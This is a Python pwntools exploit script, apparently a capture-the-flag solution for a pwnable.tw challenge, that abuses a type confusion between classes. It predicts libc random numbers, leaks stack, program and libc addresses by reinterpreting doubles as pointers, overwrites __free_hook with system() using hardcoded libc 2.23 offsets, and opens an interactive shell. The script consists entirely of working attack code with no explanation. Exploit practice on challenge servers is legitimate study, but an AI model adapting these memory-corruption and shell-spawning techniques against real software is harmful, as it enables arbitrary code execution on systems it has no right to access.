###Type confusion due to irrational type conversion between classes

from pwn import *
from ctypes import *

###Util
def genrand(seed=None):
    if seed is None:
        cnt = 1
        libc.srand(libc.time(None))
    else:
        cnt = 5
        libc.srand(seed)
    return [libc.rand()+1 for i in range(cnt)]

def game():
    global SEED, LANGEXP
    r.sendlineafter('choice: ','2')
    randnumt = genrand()
    randnums = genrand(SEED+4444)
    res = r.recvuntil(' Slime !\n')
    if b'King' in res:
        randnum = randnumt
    else:
        randnum = randnums
        SEED+=4444
    exp, target = r.recvline().split(b' ')[7:9]
    for idx,num in enumerate(randnum):
        r.sendlineafter(f'number {idx+1} :',str(num))
        if len(randnum)<5:
            randnum+=genrand()
    LANGEXP[target.decode()]+=int(exp)

def setLang(idx,ratio,meta):
    r.sendlineafter('choice: ',str(idx))
    if type(ratio)!=type(''):
        ratio = str(ratio)
    r.sendlineafter('Ratio: ',ratio)
    if type(meta)!=type('') and type(meta)!=type(b''):
        meta = str(meta)
    r.sendlineafter(': ',meta)

def manage_web():
    r.sendlineafter('choice: ','3')
    r.sendlineafter('> : ','w')

def manage_trojan():
    r.sendlineafter('choice: ','3')
    r.sendlineafter('> : ','t')

def show_status():
    r.sendlineafter('choice: ','1')
    res = []
    for i in range(2):
        r.recvuntil('Ratio: ')
        rat = r.recvuntil(' %',drop=True)
        r.recvuntil(('version: ','Arch: '))
        res.append((rat,r.recvline()[:-1]))
    return res

def change_lang(langs):
    r.sendlineafter('choice: ','2')
    for i in range(2):
        setLang(*langs[i])

def leave_manage():
    r.sendlineafter('choice: ','3')

###Preparation
cdll.LoadLibrary("libc.so.6")
libc = CDLL("libc.so.6")
SEED = 0x44444444
LANGEXP = {'ASM':0, 'C':0, 'Ruby':0, 'Java':0, 'Python':0, 'Javascript': 0}
PROJECT = {'Web':None,'Trojan':None}

###Addr
#  libc2.23
skills_offset = 0x20d048
setvbuf_got_offset = 0x20cdd8
setvbuf_offset = 0x6fe70
system_offset = 0x45390
free_hook_offset = 0x3c57a8

###Exploit
r = remote('chall.pwnable.tw',10409)
while PROJECT['Web'] is None or PROJECT['Trojan'] is None:
    game()
    if LANGEXP['Ruby']>=500 and LANGEXP['Java']>=500 and PROJECT['Web'] is None:
        setLang(1,'+','+')
        setLang(1,'+','+')
        LANGEXP['Javascript'] = 500
        PROJECT['Web'] = 1
    if LANGEXP['ASM']>=500 and LANGEXP['C']>=500 and PROJECT['Trojan'] is None:
        setLang(1,'+','M30W')
        setLang(2,'+',1)
        LANGEXP['Python'] = 500
        PROJECT['Trojan'] = 1
    print(LANGEXP)
manage_trojan()
stack = int(show_status()[0][0])
print(hex(stack))

change_lang(((1,'+','M30W'),(3,'+',str(c_double.from_buffer(c_longlong(stack)).value))))    #ASM, Python
skills_addr = u64(show_status()[1][1]+b'\x00\x00')
code_base = skills_addr-skills_offset
print(hex(code_base))

change_lang(((1,'+','M30W'),(3,'+',str(c_double.from_buffer(c_longlong(code_base+setvbuf_got_offset)).value))))    #ASM, Python
setvbuf_addr = u64(show_status()[1][1]+b'\x00\x00')
libc_base = setvbuf_addr-setvbuf_offset
print(hex(libc_base))
leave_manage()

manage_web()
change_lang(((3,'+','M30W'),(1,'+','+')))
change_lang(((2,'+',str(c_double.from_buffer(c_longlong(libc_base+free_hook_offset-8)).value)),(1,'+','+')))
change_lang(((3,'+',b'/bin/sh\x00'+p64(libc_base+system_offset)),(1,'+','+')))
r.sendlineafter('choice: ','2')
r.sendlineafter('choice: ','1')
r.sendlineafter('Ratio: ','+')

r.interactive()
